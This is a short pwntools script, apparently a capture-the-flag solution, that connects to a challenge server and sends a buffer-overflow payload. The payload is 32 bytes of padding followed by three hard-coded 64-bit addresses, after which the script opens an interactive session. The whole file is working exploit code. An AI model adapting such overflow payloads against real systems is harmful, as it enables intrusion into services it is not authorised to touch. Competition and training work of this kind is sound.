from pwn import *


p = remote("pwn.chall.pwnoh.io", 13379)
# p = process("./chall2")
# pid = gdb.attach(p,gdbscript="b * vuln+42")

pad = "A" * 32


payload = pad
payload += p64(0x601050)
payload += p64(0x000000004011e0)
payload += p64(0x00000401245)


p.send(payload)

p.interactive()
	